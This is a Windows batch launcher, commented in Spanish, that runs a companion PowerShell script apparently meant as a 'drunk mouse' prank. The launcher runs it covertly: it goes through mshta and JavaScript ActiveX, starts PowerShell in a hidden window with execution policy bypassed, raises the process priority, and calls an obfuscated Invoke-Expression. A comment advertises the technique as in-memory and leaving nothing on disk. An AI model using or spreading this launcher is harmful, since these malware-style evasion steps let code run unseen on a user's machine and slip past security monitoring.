echo off
setlocal
chcp 65001 >nul 2>&1

set "PS1=%~dp0RatonBorrachu-Multi.ps1"
if not exist "%PS1%" (
    echo [Ratón borrachu] No se encuentra el .ps1
    timeout /t 4 >nul
    exit /b 1
)

rem --- Detectar PowerShell (pwsh primero) ---
set "PS=powershell.exe"
if exist "%ProgramFiles%\PowerShell\7\pwsh.exe" set "PS=%ProgramFiles%\PowerShell\7\pwsh.exe"
if exist "%ProgramFiles%\PowerShell\7-preview\pwsh.exe" set "PS=%ProgramFiles%\PowerShell\7-preview\pwsh.exe"

rem --- Técnica 100% limpia: todo en memoria, sin tocar disco ---
for /f "delims=" %%A in ('mshta "javascript:close(new ActiveXObject('Scripting.FileSystemObject').GetStandardStream(1).Write(''+(new ActiveXObject('WScript.Shell')).Exec('%PS% -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"& {Add-Type -A System.Windows.Forms; $null=[System.Windows.Forms.Cursor]; $p=Get-Process -Id $PID; $p.PriorityClass=''High''; I''''Ex %PS1%}')).Status');"') do set "X=%%A"

exit /b 0

